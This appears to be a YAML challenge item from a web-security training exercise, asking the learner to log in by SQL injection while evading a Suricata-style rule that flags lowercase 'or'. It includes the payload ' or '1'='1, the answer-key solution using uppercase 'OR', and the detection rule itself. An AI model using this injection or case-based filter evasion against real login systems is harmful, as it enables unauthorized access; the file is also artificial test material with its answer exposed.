name: 'SQL Injection (Login) 5'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Log in**

hints: []

target: hidden-reports

base_request: |-
  POST / HTTP/1.1
  Host: localhost

  passphrase=' or '1'='1

solution: |-
  POST / HTTP/1.1
  Host: localhost
  Content-Length: 22
  Content-Type: application/x-www-form-urlencoded

  passphrase=' OR '1'='1

solution_note: Case on the 'OR'

rules:
# Avoid 'or'
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; url_decode; content: "passphrase="; content: "or"; sid:123456; rev:1;)

expected_output: "TOP SECRET"
